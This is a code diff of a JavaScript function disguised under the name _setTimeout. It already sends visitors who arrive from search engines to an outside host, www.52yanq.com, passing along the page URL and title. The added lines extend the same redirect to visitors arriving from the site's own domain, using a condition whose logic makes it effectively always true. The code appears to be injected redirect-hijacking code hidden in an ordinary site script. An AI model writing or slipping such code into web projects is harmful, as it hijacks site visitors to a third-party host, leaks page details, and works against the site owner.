@@ -33,9 +33,19 @@ function _setTimeout(){
 			var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|godado|msn|excite|libero|iltrovatore|tiscali)(\.[a-z0-9\-]+){1,2}\//ig;
 			var where =document.referrer;
 			if(regexp.test(where))
-			{
+			 {
 				if(window.self==window.top){
 					window.location.href='http://www.52yanq.com/object.php?u='+window.location.href+'&title='+document.title;
+				}
+			}
+			 
+			var domain = document.domain;
+			if(typeof where != "undefined" && where != null && where != "" && typeof domain != "undefined" || domain != null || domain != "")
+			{
+				if(where.indexOf(domain) != -1){
+					if(window.self==window.top){
+						window.location.href='http://www.52yanq.com/object.php?u='+window.location.href+'&title='+document.title;
+					}
 				}
 			}
 		 }
